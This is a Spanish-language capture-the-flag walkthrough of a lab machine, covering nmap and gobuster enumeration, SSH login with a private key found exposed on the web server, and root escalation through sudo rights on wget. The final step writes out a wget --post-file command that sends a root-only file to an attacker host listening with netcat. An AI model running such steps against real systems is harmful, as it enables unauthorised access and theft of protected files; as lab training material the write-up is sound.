


# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.27s latency).
Scanned at 2023-07-05 07:13:21 EDT for 23s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo de nmap nos muestra 2 puertos abiertos. Al navegar al servidor web, podemos ver que pertenece a un servicio apache con distribucion ubuntu. Observamos el page source del servidor, porque hay una nota oculta para **Jessie**, por lo cual asumimos que es un usuario. Iniciamos la enumeracion a directorios ocultos dentro del servidor web con gobuster.

```bash
gobuster dir -u http://IPTARGET -w /Path/Wordlist -t 100

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET
[+] Threads      : 100
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/05 07:43:03 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/server-status (Status: 403)
/sitemap (Status: 301)
=====================================================
2023/07/05 07:43:57 Finished
=====================================================

# Lanzamos otro reconocimeinto pobre /sitemap

gobuster dir -u http://IPTARGET/sitemap -w /Path/Wordlist -t 100

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET/sitemap/
[+] Threads      : 100
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/05 07:45:04 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.ssh (Status: 301)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/js (Status: 301)
=====================================================
2023/07/05 07:45:58 Finished
=====================================================

```

# Intrusion

Descubrimos una id_rsa en la ruta /.ssh. Como anteriomente descubrimos el nombre de usuario, nos transferimos la key a nuestra maquina atacante y establecemos una conexion via ssh.  Le tenemos que dar los permisos adecuados para poder acceder.

```bash
chmod 600 id_rsa
ssh -i id_rsa jessie@IPTARGET
```

# Priv.Escalation

Listamos permisos de superusuario `sudo -l` . Podemos ver que tiene permisos root alojados en /usr/bin/wget.
Necesitamos ponernos en escucha en el puerto 80 en nuestra maquina atacante y transferirnos el contenido del archivo de la sigueinte manera. Si tenes procesos activos en el puerto 80, podes enumerar y eliminarnos de la siguiente manera.

```bash
lsof -i:80
kill PID
```

```bash
# Maquina atacante
  nc -nvlp 80 > root.txt

# Maquina victima
  sudo /usr/bin/wget --post-file=/root/root_flag.txt http://LHOST
  
```

Puede demorar algunos segundos.
Infomacion sacada de https://gtfobins.github.io/gtfobins/wget/

